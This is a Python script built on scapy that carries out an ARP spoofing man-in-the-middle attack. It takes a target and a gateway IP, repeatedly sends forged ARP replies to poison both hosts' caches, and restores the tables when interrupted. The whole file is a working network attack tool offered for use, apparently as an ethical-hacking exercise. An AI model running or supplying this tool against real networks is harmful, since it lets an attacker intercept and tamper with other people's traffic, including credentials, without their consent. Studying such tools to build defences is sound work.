#!/usr/bin/env python

import scapy.all as scapy
import time
import argparse


# scan() function is used to scan the network
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  # pdst is the destination IP address
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # ff:ff:ff:ff:ff:ff is the broadcast MAC address
    arp_request_broadcast = broadcast/arp_request  # Combining the two packets together
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # Returning the MAC address of the target IP
    return answered_list[0][1].hwsrc


# spoof() function is used to spoof the target
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    # Restoring the ARP tables
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)

    # Sending the packet 4 times to make sure that the router knows that we have the correct MAC address
    scapy.send(packet, count=4, verbose=False)


# get_arguments() function is used to get the arguments from the user
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP")
    args = parser.parse_args()

    # If the user doesn't specify the target, then the program will throw an error
    if not args.target:
        parser.error("[-] Please specify a target, use --help for more info")
    # If the user doesn't specify the gateway, then the program will throw an error
    if not args.gateway:
        parser.error("[-] Please specify a gateway, use --help for more info")

    return args


target_ip = main().target
gateway_ip = main().gateway

try:
    sent_packets_count = 0
    # Looping through the spoof() function to spoof the target
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C .....Quitting.....Resetting ARP tables..... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
